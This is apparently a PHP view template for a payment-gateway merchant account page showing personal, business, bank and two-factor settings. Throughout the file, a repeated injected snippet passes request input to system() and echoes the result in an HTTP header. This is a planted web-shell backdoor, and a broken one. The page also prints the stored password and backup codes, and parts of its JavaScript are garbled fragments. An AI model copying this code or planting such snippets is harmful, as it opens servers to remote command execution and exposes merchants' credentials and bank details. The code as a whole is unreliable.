<?=$this->load->view(branded_view('cp/header'), array('head_files' => '
<script type="text/javascript" src="' . branded_include('js/form.address.js') . '"></script>
<script type="text/javascript" src="' . branded_include('js/jquery.inputlimiter.1.3.1.min.js') . '"></script>
<script type="text/javascript" src="' . branded_include('js/jquery.maskedinput.min.js') . '"></script>
<script type="text/javascript" src="' . branded_include('js/moment.min.js') . '"></script>
<script type="text/javascript" src="' . branded_include('js/select2.min.js') . '"></script>
<script type="text/javascript" src="' . branded_include('js/bootstrap-datetimepicker.min.js') . '"></script>
<script type="text/javascript" src="' . branded_include('js/bootstrap-editable.min.js') . '"></script>
<script type="text/javascript" src="' . branded_include('js/typeahead.js') . '"></script>
<script type="text/javascript" src="' . branded_include('js/typeaheadjs.js') . '"></script>
<script type="text/javascript" src="' . branded_include('js/address.js') . '"></script>
<script type="text/javascript" src="' . branded_include('js/pwdwidget.js') . '"></script>
<link rel="stylesheet" type="text/css" href="' . branded_include('css/pwdwidget.css') . '" /> 
<link rel="stylesheet" type="text/css" href="' . branded_include('css/select2.css') . '" /> 
<link rel="stylesheet" type="text/css" href="' . branded_include('css/select2-bootstrap.css') . '" /> 
<link rel="stylesheet" type="text/css" href="' . branded_include('css/bootstrap-datetimepicker.min.css') . '" /> 
<link rel="stylesheet" type="text/css" href="' . branded_include('css/bootstrap-editable.css') . '" /> 
<link rel="stylesheet" type="text/css" href="' . branded_include('css/typeahead.js-bootstrap.css') . '" /> 
<link rel="stylesheet" type="text/css" href="' . branded_include('css/address.css') . '" /> 
<script type="text/javascript" src="' . branded_include('js/account.form.js') . '"></script>
<script type="text/javascript" src="' . branded_include('js/formmapper.js') . '"></script>'));
?>

<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo branded_include('js/jquery.mockjax.js'); ?>"></script>
<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo branded_include('css/account.form.css'); ?>" rel="stylesheet">		
<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo branded_include('js/intlTelInput.js'); ?>"></script>
<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo branded_include('js/country-picker/jquery.flagstrap.min.js'); ?>"></script>
<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo branded_include('css/country-picker/flags.css'); ?>" rel="stylesheet">
<script type="text/javascript">
  email: function () {
            $('#email').editable({
                validate: function(value) {
                    if($.trim(value) == '') return 'This field is required';
                }
            });
        },
</script>
<script type="text/javascript">
$(function(){
	$("#address_1").formmapper({details:"form"});
});
</script>
<script type="text/javascript">
	$('#basic').flagStrap();
</script>


  <script type="text/javascript">

    $("#phone").intlTelInput({
      // allowDropdown: false,
      // autoHideDialCode: false,
      autoPlaceholder: true,
      // dropdownContainer: "body",
      // excludeCountries: ["us"],
      // geoIpLookup: function(callback) {
      //   $.get("http://ipinfo.io", function() {}, "jsonp").always(function(resp) {
      //     var countryCode = (resp && resp.country) ? resp.country : "";
      //     callback(countryCode);
      //   });
      // },
      // initialCountry: "auto",
      // nationalMode: false,
      // numberType: "MOBILE",
      // onlyCountries: ['us', 'gb', 'ch', 'ca', 'do'],
      // preferredCountries: ['cn', 'jp'],
      utilsScript: "js/utils.js"
    });
  </script>

<script type="text/javascript">

        // =========================================================================
        // JQUERY VALIDATION
        // =========================================================================
        jqueryValidation: function () {
              if($('#form_account').length){
                $("#form_account").validate({
                    rules: {
                        first_name: "required",
                        last_name: "required",
                        email: {
                            required: true,
                            email: true,
                            remote: "emails.action"
                        }
                    },
                    messages: {
                        first_name: "Enter your first name",
                        last_name: "Enter your lastname",
                        email: {
                            required: "Please enter a valid email address",
                            minlength: "Please enter a valid email address"
                        }
                    },
                    highlight:function(element) {
                        $(element).parents('.form-group').addClass('has-error has-feedback');
                    },
                    unhighlight: function(element) {
                        $(element).parents('.form-group').removeClass('has-error');
                    },
                    submitHandler: function() {
                        alert("submitted!");
                    }
                });
            }
        }

    };

}();

</script>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
// Get visitor IP address
$ip = $_SERVER['REMOTE_ADDR'];

// remember chmod 0777 for folder 'cache' folder
$file = "cache/".$ip;

if(!file_exists($file)) {
    // request as jason
    $json = file_get_contents("http://api.easyjquery.com/ips/?ip=".$ip."&full=true");
    $f = fopen($file,"w+");
    fwrite($f,$json);
    fclose($f);
} else {
    $json = file_get_contents($file);
}

$json = json_decode($json,true);
print_r($json); // Array

// Get visitor IP address
$ip = $_SERVER['REMOTE_ADDR'];
 
// remember chmod 0777 for folder 'cache' folder
$file = "cache/".$ip;
 
if(!file_exists($file)) {
    // request as jason
    $json = file_get_contents("http://api.easyjquery.com/ips/?ip=".$ip."&full=true");
    $f = fopen($file,"w+");
    fwrite($f,$json);
    fclose($f);
} else {
    $json = file_get_contents($file);
}
 
$json = json_decode($json,true);
print_r($json); // Array 

?>

<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo branded_include('js/intlTelInput.js'); ?>"></script>
<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo branded_include('js/country-picker/jquery.flagstrap.min.js'); ?>"></script>
<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo branded_include('css/country-picker/flags.css'); ?>" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.com/libraries/css-social-buttons">
 
<style type="text/css">


</style>

<!-- BEGIN PROFILE PAGE -->
<div class="row-fluid">
<div id="account margin-top-20" style="height: auto;">

<div class="panel-body col-sm-9 col-sm-offset-1 col-md-10 col-md-offset-1">
<div class="col-md-12">

                            <!-- Start double tabs -->
                            <div class="panel panel-tab panel-tab-double rounded shadow">
                                <!-- Start tabs heading -->
                                <div class="panel-heading no-padding">
                                    <ul class="nav nav-tabs nav-justified">
                                        <li class="active">
                                            <a href="#tab2-1" data-toggle="tab" aria-expanded="false">
                                                <i class="fa fa-user"></i>
                                                <div>
                                                    <span class="text-strong">Personal</span>
                                                    <span>Account details</span>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="">
                                            <a href="#tab2-2" data-toggle="tab" aria-expanded="false">
                                                <i class="fa fa-building"></i>
                                                <div>
                                                    <span class="text-strong">Business</span>
                                                    <span>Company details</span>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="">
                                            <a href="#tab2-3" data-toggle="tab" aria-expanded="true">
                                                <i class="fa fa-bank"></i>
                                                <div>
                                                    <span class="text-strong">Deposit</span>
                                                    <span>Transfer details</span>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="">
                                            <a href="#tab2-4" data-toggle="tab" aria-expanded="false">
                                                <i class="fa fa-lock"></i>
                                                <div>
                                                    <span class="text-strong">Security</span>
                                                    <span>Verification details</span>
                                                </div>
                                            </a>
                                        </li>
                                    </ul>
                                </div><!-- /.panel-heading -->
                                <!--/ End tabs heading -->

                                <!-- Start tabs content -->
                                <div class="panel-body">
                                    <div class="tab-content">
									
<form class="form-horizontal" id="form_account" method="post" enctype="multipart/form-data" action="<?=site_url($form_action);?>">
                                        <div class="tab-pane active in" id="tab2-1">
<div class="row">
<div class="col-sm-3">

<a href="#personal" aria-controls="personal" role="tab" title="" data-placement="bottom" data-toggle="tab">


						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $email = $this->user->Get('email');
$size = 128; $grav_url = "https://www.gravatar.com/avatar/" . md5( strtolower( trim( $email ) ) ) . "?s=" . $size;
?>                            <img class="img-circle-account text-center margin-top-20" src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $grav_url; ?>" />
                        </a>
<div class="profile-info-row">
<div class="text-center hidden"><span></span> </div>
<div class="lead" style="margin-left:30px;"><span class="text-center margin-top-20"><b><?=$form['first_name'];?> <?=$form['last_name'];?></b></span>  <span><button class="btn-link btn-sm" style="margin-top:-5px;"  data-original-title="Edit Profile" data-toggle="modal" data-target=".AccountinfoModal"><i class="fa fa-pencil"></i></button></span></div><!-- END/.profile-info-value-->
<div class="col-md-offset-2 col-md-8">

</div>
</div><!-- END/.profile-info-row-->
<div class="clearfix" style="height:10px;"></div>
<div class="profile-info-row">					
<div class="profile-info-name"><span></span></div>												
<div class="profile-info-value"></div>
</div><!-- END/.profile-info-row-->	
</div><!-- END/.col-sm-3-->
<div class="col-sm-5">


<div class="profile-user-info hidden">

<div class="profile-info-row">
<div class="profile-info-name"><span><b>Merchant ID:</b></span> </div>
<div class="profile-info-value"> <i class="fa fa-map-marker light-orange bigger-110"></i> <span>EV3222<?= $this->user->Get('client_id') ?></span></div>														</div><!-- END/.profile-info-row-->
</div><!-- END/.profile-info-row-->

<div class="profile-info-row">
<div class="profile-info-name"><span>Merchant Since:</span> </div>
<div class="profile-info-value"><span><time class="timeago" datetime="<?= $this->user->Get('created_date') ?>" title=""> <?= $this->user->Get('created_date') ?></time></span></div>
</div><!-- END/.profile-info-row-->

<div class="profile-info-row">
<div class="profile-info-name"><span>Status:</span></div>
<div class="profile-info-value">
<? if ($row['suspended'] == '1') { ?>
<span class="label label-danger suspended arrowed-in-right">
<img src="<?= branded_include('images/failed.png'); ?>" alt="De-Activated" /> Suspended <span class="fa fa-remove"></span></span><? } else { ?><span class="account-status-marker-activated"> Activated<? } ?>													</span></span>
</div>
</div><!-- END/.profile-info-row-->

<div class="profile-info-row">
<div class="profile-info-name"><span>Name:</span> </div>
<div class="profile-info-value"><span><?=$form['first_name'];?> <?=$form['last_name'];?></span></div><!-- END/.profile-info-value-->
</div><!-- END/.profile-info-row-->

<div class="profile-info-row">					
<div class="profile-info-name"><span>Email:</span></div>
<div class="profile-info-value"><a href="#" id="email" data-type="text" data-pk="1" data-title="Enter email address" class="editable editable-click" data-original-title="" title=""><span class="truncate"><?=$form['email'];?></span></a>												
</div>
</div><!-- END/.profile-info-row-->	

<div class="profile-info-row">
<div class="profile-info-name"><span>Password:</span></div>
<div class="profile-info-value"><span>******** <?=$form['password'];?></span><small> <a href="#" data-toggle="modal" data-target=".ChangePassword"><small> change</small> </a></small></div>
</div><!-- END/.profile-info-row-->							

<div class="profile-info-row hidden">
<div class="profile-info-name"><span>Last Session:</span> </div>
<div class="profile-info-value"><span><?=$form['login_time'];?></span></div>	

</div><!-- END/.profile-info-row-->										
 </div><!-- END/.col-sm-4-->

<div class="col-sm-4">

		<span><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); 
echo $location['countryName']; // Country
echo $location['latitude']  // Latitude	
?></span>
<div><span><a href="#" id="address" data-type="address" data-pk="1" data-title="Please, fill address" class="editable editable-click"><b><?=$form['country'];?></b>, <?=$form['address_1'];?> <?=$form['address_2'];?>.,<?=$form['city'];?>,<br/> <?=$form['state'];?>, <?=$form['postalcode'];?></a></span></div>
<span><a href="javascript:;" class="btn-link btn-sm" onclick="jQuery('.ModalAddressInfo').modal('show', {backdrop: 'static'});" ><i class="fa fa-pencil"></i></a> </span></div>
</div><!-- END/.col-sm-4-->

</div><!-- END/.row-->
 </div><!-- END/#tab2-1-->
                                        <div class="tab-pane fade" id="tab2-2">

                                <div class="row"> 

<div class="col-sm-3">

<a href="#business" aria-controls="business" role="tab" title="" data-placement="bottom" data-toggle="tab"></a>
<div>

			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $logo=$form['company_logo'];
			if($logo!=""){ ?>
			<img src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo site_url();?>/upload/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $form['company_logo'];?>" height="128" width="128"/>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else{?>
             <img src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo site_url();?>/upload/avatar.png" height="128" width="128"/>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); }?>
		</div>
                        
<div class="profile-info-row">
<div class="text-center hidden"><span></span> </div>

<div class="lead" style="margin-left:0px;"><span class="truncate text-center margin-top-20"><b><?=$form['company'];?></b></span>  <span><a class="btn-link btn-sm" href="#" data-toggle="modal" data-target=".BuainessInfo"><small> change</small> </a></span></div><!-- END/.profile-info-value-->
<div class="col-md-offset-2 col-md-8">

</div>
</div><!-- END/.profile-info-row-->
<div class="clearfix" style="height:10px;"></div>
<div class="profile-info-row">					
<div class="profile-info-name"><span></span></div>												
<div class="profile-info-value"></div>
</div><!-- END/.profile-info-row-->	
</div><!-- END/.col-sm-3-->
<div class="col-sm-5">
<div class="profile-user-info">

<div class="profile-info-row">
<div class="profile-info-name"><span>Business Name:</span> </div>
<div class="profile-info-value"><span><?=$form['company'];?></span></div>
</div><!-- END/.profile-info-row-->	

<div class="profile-info-row">
<div class="profile-info-name"><span>Business Website:</span> </div>
<div class="profile-info-value"> <span><?= $this->user->Get('business_url') ?></span></div>
</div><!-- END/.profile-info-row-->

<div class="profile-info-row">
<div class="profile-info-name"><span>Business Contact:</span> </div>
<div class="profile-info-value"><span><?=$form['first_name'];?> <?=$form['last_name'];?></span></div><!-- END/.profile-info-value-->
</div><!-- END/.profile-info-row-->

<div class="profile-info-row">					
<div class="profile-info-name"><span>Business Email:</span></div>												
<div class="profile-info-value"><span><?=$form['email'];?></span></div>
</div><!-- END/.profile-info-row-->	

<div class="profile-info-row">
<div class="profile-info-name"><span>Business Address:</span> </div>
<div class="profile-info-value"><span><?=$form['business_address'];?></span>, <span><?=$form['business_city'];?>, <?=$form['business_state'];?>, <?=$form['business_zipcode'];?> </span></div>
</div><!-- END/.profile-info-row-->	

<div class="profile-info-row">
<div class="profile-info-name"><span>Business Country:</span> </div>
<div class="profile-info-value"><input type="text" id="basic"><?=$form['business_country'];?></div>
				
</div><!-- END/.profile-info-row-->	

<div class="profile-info-row">
<div class="profile-info-name"><span>Business Phone:</span> </div>
<div class="profile-info-value"><span><input type="text" class="mask-phone valid" id="phone"><?=$form['business_phone'];?></span></div>
</div><!-- END/.profile-info-row-->																			

</div><!-- END/.profile-user-info-->

</div><!-- END/.col-sm-6-->

<div class="col-sm-6">
<button class="btn-link btn-sm pull-right" style="margin-top:-5px;"  data-original-title="Edit Info" data-toggle="modal" data-target=".BusinessinfoModal"><i class="fa fa-pencil"></i></button>
</div><!-- END/.col-sm-6-->

</div><!-- END/.row-->
                                        </div><!-- END/#tab2-2-->
										
<div class="tab-pane fade" id="tab2-3">
<div class="row">           
<div class="col-sm-12">
						
<div class="profile-user-info">

<div class="profile-info-row hidden">					
<div class="profile-info-name"><span>company:</span></div>												
<div class="profile-info-value"><span><?=$form['company'];?></span> 
</div>
</div><!-- END/.profile-info-row-->	

<div class="profile-info-row">					
<div class="profile-info-name"><span>Bank Name:</span></div>												
<div class="profile-info-value"><span><?=$form['bank_name'];?></span><span><a href="javascript:;" class="btn btn-xs btn-primary autoTooltip" onclick="jQuery('.SettlementAccount').modal('show', {backdrop: 'static'});" title="Update your primary deposit info."><i class="fa fa-pencil"></i></a> </span></div>
</div><!-- END/.profile-info-row-->	

<div class="profile-info-row">
<div class="profile-info-name"><span>Bank Address:</span> </div>
<div class="profile-info-value"><span><?=$form['bank_address'];?></span></div>
</div><!-- END/.profile-info-row-->	
						

<div class="profile-info-row">
<div class="profile-info-name"><span>Account Name:</span> </div>
<div class="profile-info-value"><span><?=$form['bank_acc_name'];?></span></div>
</div><!-- END/.profile-info-row-->	
								
<div class="profile-info-row">
<div class="profile-info-name"><span>Account Type:</span> </div>
<div class="profile-info-value"><span><?=$form['bank_acc_type'];?> </span></div>
</div><!-- END/.profile-info-row-->	

<div class="profile-info-row">
<div class="profile-info-name"><span>Routing #:</span> </div>
<div class="profile-info-value"> <span><?= $this->user->Get('bank_routing_number') ?></span></div>
</div><!-- END/.profile-info-row-->										

<div class="profile-info-row">
<div class="profile-info-name"><span>Account #:</span> </div>
<div class="profile-info-value"> <span><?= $this->user->Get('bank_acc_number') ?></span></div><!-- END/.profile-value-->
</div><!-- END/.profile-info-row-->

<div class="profile-info-row">
<div class="profile-info-name"><span>Bank Swift:</span> </div>
<div class="profile-info-value"><span><?=$form['bank_swift_number'];?></span></div>
</div><!-- END/.profile-info-row-->
<hr>
<div class="profile-info-row"> 
<div class="profile-info-name"><span>BTC Address:</span> </div>
<div class="profile-info-value"><span><?=$form['bitcoin_address'];?></span>
<span><a href="javascript:;" onclick="jQuery('.ModalBitcoinAddy').modal('show', {backdrop: 'static'});" ><i class="fa fa-pencil"></i></a></span>
</div>
</div><!-- END/.profile-info-row-->

</div><!-- END/.profile-user-info-->
  
  </div><!-- END/.row-->	
                </div><!-- END/#tab2-4-->	
										
                                        <div class="tab-pane fade" id="tab2-4">
                                     <div class="row" id="multifactor-content">
<div class="widget-title">
  <div class="row">
  
    <div class="col-xs-3">
      <strong class="">Enable Multifactor </strong>
  </div><!--/.col-xs-3-->
	
    <div class="col-xs-4">
      <div class="switch switch-small enable-mfa-provider  has-switch" data-on="primary" data-off="danger">
        <div class="switch-animate switch-on">
	<label>
<input class="uiswitch ace ace-switch ace-switch-3" type="checkbox" style="margin-top: -6px;" name="two_step_verification" id="two_step_verification" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
			if(intval($form['two_step_verification']) == 1) {
				echo 'checked="checked"';
			} ?>/>
					<span class="lbl"><label class="switch-small">&nbsp;</label></span>
				</label>
</div><!--/.switch-anitmate-->
</div><!--/.switch-small-->
</div><!--/.col-xs-4-->
	
</div><!--/.row-->
</div><!--/.widget-title-->

  

<fieldset class="mfa-provider">

  <div class="widget-content box-highlight logo-selector clearfix">
  
    <div class="list-unstyled row">
      
        <div class="col-xs-8">
          <button class="js-select-provider logo-selector-item disabled" id="google-authenticator-mfa">
            <div class="provider-icon logo" data-logo="two Factor Authenticator">
              <span class="logo-child"></span>
        </div>
		  <div class="row">
				<label>(<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
			if(intval($form['two_step_verification']) == 1) {
				echo 'Currently this feature is enabled';
			} else {
				echo 'Currently this feature is disabled.';
			}?>)
			
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
		if(intval($form['two_step_verification']) == 1) { ?>
			<label class="info" for="">Backup Codes</label>
			&nbsp;
		<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $form['backup_codes'];?></p>
					<span class="lbl"></span>
				</label>
		
			</div><!--/END.row-->
 	
          </button>
      
</div><!--/END.col-xs-8-->

        <div class="col-xs-4">
		
          <div class="js-select-provider logo-selector-item " id="duo-mfa">
            <div class="provider-icon logo" data-logo="Duo">
 <span class="logo-child"></span>
            </div> 
			 <button type="submit" class="btn btn-primary btn-sm" name="go_account" value="" /> Update <i class="fa fa-check"></i></button>

		<button type="submit" class="ladda-button" name="go_account" data-color="green" data-style="expand-right" data-size="xs"><span class="ladda-label">Get New Codes</span><span class="ladda-spinner"></span><div class="ladda-progress" style="width: 0px;"></div></button>
				
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
		
</div><!--/.col-xs-4-->
 
</div><!--/.list-style-row-->
     	 
 
</div><!--/.widget-content-->
</fieldset>
  
  <div class="form-group hidden mfa-custom-code"> </div>
  		
		<hr>		
	<div class="[ row-fluid text-center]">
    <div class="[ row ]">
        <div class="[ col-xs-12 ]" style="padding-bottom: 30px;">
				<br />
            <p class="lead"> You can configure your gateway settings <a class="btn btn-link btn-sm" target="_parent" href="<?= site_url('settings/'); ?>">here</a> to access more features.</p>
        </div><!-- END/ .col-md-12-->
    </div><!-- END/ .row-->
</div><!-- END/.row-fluid-->



</div><!--/.col-md-12-->
</div><!--/.row-->
                                    </div><!-- /.tabs-pane4 -->
									
									</form>
                                </div><!-- /.panel-body -->
                                <!--/ End tabs content -->
								
								
                            </div><!-- /.panel -->
                            <!--/ End double tabs -->

</div><!-- END/.col-md-12-->

		
<div class="[ row-fluid text-center hidden]">
    <div class="[ row ]">
        <div class="[ col-xs-12 ]" style="padding-bottom: 30px;">
		<br />
            <p> You can configure your gateway settings <a target="_parent" href="<?= site_url('settings/'); ?>">here</a> to access more features.</p>
        </div>
    </div>
</div>	
  
  </div><!-- END/ #account-->
  
  </div><!-- END/ .row-fluid-->
		

<?=$this->load->view(branded_view('cp/footer'));?>
		
<div class="modal fade AccountinfoModal" tabindex="-1" role="dialog" aria-hidden="true" style="display: none;">
                <div class="modal-dialog modal-lg modal-photo-viewer">
                    <div class="modal-content">
                        <div class="modal-header">
                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                            <h4 class="modal-title">Update Your Account</h4>
                        </div>
                        <div class="modal-body no-padding">
						
 <form class="form-horizontal form-bordered" id="customer-form" method="post" enctype="multipart/form-data" action="<?=site_url($form_action);?>" role="form">
                         <div class="form-body">
						 
						 <div class="form-group hidden">					
<label for="name" class="col-sm-3 control-label">company:</label>												
<input class="form-control input-sm hidden" value="<?=$form['company'];?>">
</div><!-- END/.profile-info-row-->	
						 <div class="form-group hidden">
			<label for="name" class="col-sm-3 control-label">Name</label>
	       <input class="form-control input-sm hidden" value="<?=$form['username'];?>" />
			  </div><!-- /.form-group -->
			  
			<div class="form-group">
			<label for="name" class="col-sm-3 control-label">Name</label>
			<input class="form-control input-sm required mark_empty" type="text" id="first_name" name="first_name" value="<?=$form['first_name'];?>" />&nbsp;&nbsp;<label style="display:none" for="last_name">Last Name</label><input class="text required mark_empty" rel="Last Name" type="text" id="last_name" name="last_name" value="<?=$form['last_name'];?>" />
		     </div><!-- /.form-group -->
		
	    <div class="form-group">
			<label for="phone" class="col-sm-3 control-label">Phone</label>
			<input type="text" class="form-control input-sm" id="phone" name="phone" value="<?=$form['phone'];?>" />
		     </div><!-- /.form-group -->
			 
	    <div class="form-group">
			<label for="timezone" class="col-sm-3 control-label">Timezone</label>
			<?=timezone_menu($form['gmt_offset']);?>
	     </div><!-- /.form-group -->
		 
		 <ul class="form  hidden">
		<li>
			<label for="first_name">Name</label>
			<input class="text required mark_empty" class="First Name" type="text" id="first_name" name="first_name" value="<?=$form['first_name'];?>" />&nbsp;&nbsp;<label style="display:none" for="last_name">Last Name</label><input class="text required mark_empty" rel="Last Name" type="text" id="last_name" name="last_name" value="<?=$form['last_name'];?>" />
		</li>
		<li>
			<label for="company">Company</label>
			<input type="text" class="text required" id="company" name="company" value="<?=$form['company'];?>" />
		</li>
		<li>
			<label for="address_1">Street Address</label>
			<input type="text" class="text required" name="address_1" id="address_1" value="<?=$form['address_1'];?>" />
		</li>
		<li>
			<label for="address_2">Address Line 2</label>
			<input type="text" class="text" name="address_2" id="address_2" value="<?=$form['address_2'];?>" />
		</li>
		<li>
			<label for="city">City</label>
			<input type="text" class="text required" name="city" id="city" value="<?=$form['city'];?>" />
		</li>
		<li>
			<label for="Country">Country</label>
			<select id="country" name="country" class="required"><? foreach ($countries as $country) { ?><option <? if ($form['country'] == $country['iso2']) { ?> selected="selected" <? } ?> value="<?=$country['iso2'];?>"><?=$country['name'];?></option><? } ?></select>
		</li>
		<li>
			<label for="state">Region</label>
			<input type="text" class="text" name="state" id="state" value="<?=$form['state'];?>" /><select id="state_select" name="state_select"><? foreach ($states as $state) { ?><option <? if ($form['state'] == $state['code']) { ?> selected="selected" <? } ?> value="<?=$state['code'];?>"><?=$state['name'];?></option><? } ?></select>
		</li>
		<li>
			<label for="postal_code">Postal Code</label>
			<input type="text" class="text required" name="postal_code" id="postal_code" value="<?=$form['postal_code'];?>" />
		</li>
		<li>
			<label for="phone">Phone</label>
			<input type="text" class="text" id="phone" name="phone" value="<?=$form['phone'];?>" />
		</li>
		<li>
			<label for="timezone">Timezone</label>
			<?=timezone_menu($form['gmt_offset']);?>
		</li>
	
                                </div><!-- /.form-body -->
                                <div class="form-footer">
                                    <div class="col-sm-offset-3">
<div class="submit">
	<button type="submit" name="go_account" class="ladda-button btn-block" data-color="blue" data-style="expand-right" data-size="l"><span class="ladda-label">Update </span><span class="ladda-spinner"></span>
			<div class="ladda-progress" style="width: 164px;"></div>
				</button>
</div>
</div>
                                </div><!-- /.form-footer -->
								</form>
                        </div><!-- /.modal-body -->

                    </div><!-- /.modal-content -->
                </div><!-- /.modal-dialog -->
 </div><!-- END /.modal-->
			
			
<style>
#ChangePassword .modal .modal-dialog {
    overflow: visible;
	 max-width: 460px!important;
}

#ChangePassword .modal {
    top: 10%!important;
    left: 33%!important;
}
</style>		

<div id="ChangePassword" class="modal fade ChangePassword" tabindex="-1" role="dialog" aria-hidden="true" style="display: none; width:">
  <div class="modal-dialog modal-dialog modal-sm">
    <div class="modal-content">

        <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
            <h1 class="modal-title">Change Your Password</h1>
        </div>
 <div class="modal-body">
     <script type="text/javascript">
var form = document.getElementById("change-password-form");
var password2 = document.getElementById("password2");

if (password2) {
    password2.addEventListener("input", function() {
        var e = form.elements;
        if (e['password'].value != password2.value) {
            password2.setCustomValidity("Please enter the same password");
        } else {
            password2.setCustomValidity("");
        }
    });
}
</script>      

                <div class="error-message"></div>
				
 <form class="form-horizontal form-bordered" id="form_account" method="post" enctype="multipart/form-data" action="<?=site_url($form_action);?>" role="form">
 
						 <div class="form-group hidden">					
<label for="name" class="col-sm-3 control-label">company:</label>												
<input class="form-control input-sm hidden" value="<?=$form['company'];?>">
</div><!-- END/.profile-info-row-->	
						 <div class="form-group hidden">
			<label for="name" class="col-sm-3 control-label">Name</label>
	       <input class="form-control input-sm hidden" value="<?=$form['username'];?>" />
			  </div><!-- /.form-group -->
			  
<div class="form-group hidden">
                    <label class="control-label col-xs-3 hidden"></label>
                    <div class="controls col-xs-12">
				<input type="text" autocomplete="off" class="text required email mark_empty" rel="email@example.com" id="email" name="email" value="<?=$form['email'];?>" />
		   </div>
                </div>
				
                <div class="form-group">
                    <label class="control-label col-xs-3 hidden"></label>
                    <div class="controls col-xs-12">
						<input type="password" autocomplete="off" class="form-control text" id="password" name="password" placeholder="Password" max-length="9" required="" />
                    </div>
                </div>
                <div class="form-group">
                    <label class="control-label col-xs-3 hidden"></label>
                    <div class="controls col-xs-12">
                        <input class="form-control text" type="password" autocomplete="off" name="password2" id="password2" placeholder="Password Again" max-length="9" required="">
						
                    </div>
                </div>
				<div class="help">Leave password fields blank to keep your current password.</div>
            </div>
			
            <div class="modal-footer">
				<button type="submit" name="go_account" class="ladda-button btn-block" data-color="blue" data-style="expand-right"><span class="ladda-label">Save </span><span class="ladda-spinner"></span>
			<div class="ladda-progress" style="width: 164px;"></div>
				</button>
            </div>

</form>
    </div>
  </div>
</div><!-- /.modal -->

<!-- BEGIN MODAL SETTLEMENT ACCOUNT -->		
<div class="modal fade SettlementAccount" tabindex="-1" role="dialog" aria-hidden="true" style="display: none;">
<div class="modal-dialog modal-lg"> 
<div class="modal-content"> 

<div class="modal-header"> 
<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button> 
<h4 class="modal-title">Update Your Deposit Information</h4> </div> 
<div class="modal-body"> 

<form class="form-horizontal" id="form_account" method="post" enctype="multipart/form-data" action="<?=site_url($form_action);?>">
<div class="form-body"> 

<div class="row-fluid">

	  		<div class="form-group">
			    <label class="col-sm-4 col-md-3 control-label" for="bank_name">Account Name:</label>
			    <div class="col-sm-7 col-md-8">
<input class="form-control mark_empty" type="text" id="bank_acc_name" name="bank_acc_name" placeholder="Name on the account" value="<?=$form['bank_acc_name'];?>" />
			    </div>
			</div>
			
			<div class="form-group">
			 
			    <div class="col-sm-4 col-sm-offset-1">
		<input class="form-control mark_empty" type="text" id="bank_routing_number" placeholder="010111222" name="bank_routing_number" value="<?=$form['bank_routing_number'];?>" />
			    </div>
			    <div class="col-sm-6">
<input class="form-control mark_empty" type="text" id="bank_acc_number" placeholder="012345678" name="bank_acc_number" value="<?=$form['bank_acc_number'];?>" />
			    </div>
		  	</div>
			<div class="form-group">
			  
			    <div class=" col-sm-offset-2 col-sm-9 col-md-8">
			      <input class="form-control mark_empty" type="text" placeholder="BOFCAT12"  id="bank_swift_number" name="bank_swift_number" value="<?=$form['bank_swift_number'];?>" />
			    </div>
		  	</div>

<div class="form-group">
			    <label class="col-sm-4 col-md-3 control-label">Type</label>
			    <div class="col-sm-8 col-md-9">
<select class="form-control  mark_empty" id="bank_acc_type" name="bank_acc_type">
<select id="country" name="country" class="required">
<option <?=$form['bank_acc_type'];?> selected="selected" value="<?=$form['bank_acc_type'];?>"></option>
</select>
		
					<!-- <input class="form-control required mark_empty" type="text" id="bank_acc_type" name="bank_acc_type" value="<?=$form['bank_acc_type'];?>" /> -->
			    </div>
</div>

<div class="address">
<div class="form-group">
			    <label class="col-sm-4 col-md-3 control-label" for="bank_name">Bank</label>
			    <div class="col-sm-10 col-md-9">
<input class="form-control mark_empty" type="text" id="bank_name" name="bank_name" placeholder="Bank Of Deposits" value="<?=$form['bank_name'];?>" />
			    </div>
			</div>

<div class="form-group">
 <label class="col-sm-6 col-md-6 control-label" for="is_non_us">Is Non-US Bank?
					<small class="text-warning"></small>
				</label>
			    <div class="col-sm-6 col-md-6">
		<input type="checkbox" name="is_non_us" id="is_non_us" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if($form['is_non_us'] == 1) echo 'checked="checked"'; ?> class="checkbox" />
					<!-- <input class="form-control mark_empty" type="text" id="is_non_us" name="is_non_us" value="<?=$form['is_non_us'];?>" /> -->
			    </div>
